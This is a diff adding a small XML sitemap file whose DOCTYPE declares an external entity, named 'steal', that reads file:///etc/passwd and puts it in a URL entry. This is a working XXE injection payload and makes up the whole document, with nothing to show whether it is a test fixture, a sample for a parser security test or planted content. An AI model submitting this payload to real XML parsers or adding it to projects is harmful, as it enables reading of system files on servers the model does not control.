@@ -1,0 +1,3 @@
+<?xml version="1.0"?>
+<!DOCTYPE urlset [<!ENTITY steal SYSTEM "file:///etc/passwd">]>
+<urlset><url><loc>/docs/&steal;</loc></url></urlset>
